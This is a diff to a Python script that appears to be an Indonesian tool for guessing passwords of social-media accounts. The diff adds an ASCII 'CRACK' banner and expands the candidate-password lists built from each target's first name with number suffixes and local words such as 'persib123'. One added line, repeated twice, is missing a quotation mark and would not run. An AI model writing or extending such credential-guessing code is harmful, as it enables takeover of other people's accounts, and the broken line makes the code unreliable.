@@ -151,9 +151,15 @@ def banner():
                   
 def banlog():
 	cetak(panel(f'''\t{h}[bold green]
-ngentot
-
-⠀⠀⠀⠀⠀{m}                                             ''',width=90,title=f"[bold white]• [/][bold green]𝗪𝗘𝗟𝗖𝗢𝗠𝗘[/][bold white] •[/]",style=f"bold white"))
+                                                                              
+ ██████╗██████╗  █████╗  ██████╗██╗  ██╗    
+██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝    
+██║     ██████╔╝███████║██║     █████╔╝     
+██║     ██╔══██╗██╔══██║██║     ██╔═██╗     
+╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗   
+ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   
+  
+{h}NOTE: SC SERET SOALNYA KU TAMBAH PW BANYAK                                             ''',width=90,title=f"[bold white]• [/][bold green]𝗪𝗘𝗟𝗖𝗢𝗠𝗘[/][bold white] •[/]",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def brayenlogin():
 	try:
@@ -542,8 +548,19 @@ AGAR TERHINDAR DARI SPAM IP
 					if len(frs)<3:
 						pass
 					else:
-						pwv.append('kota bandung')
-						pwv.append('kotabandung')
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'12')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append('kata sandi')
+						pwv.append(kamu nanya')
 						pwv.append('persib123')
 						pwv.append('persib1933')
 						pwv.append('bandung123')
@@ -554,8 +571,20 @@ AGAR TERHINDAR DARI SPAM IP
 					if len(frs)<3:
 						pwv.append(nmf)
 					else:
-						pwv.append('kota bandung')
-						pwv.append('kotabandung')
+						pwv.append(nmf)
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'12')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append('kata sandi')
+						pwv.append(kamu nanya')
 						pwv.append('persib123')
 						pwv.append('persib1933')
 						pwv.append('bandung123')
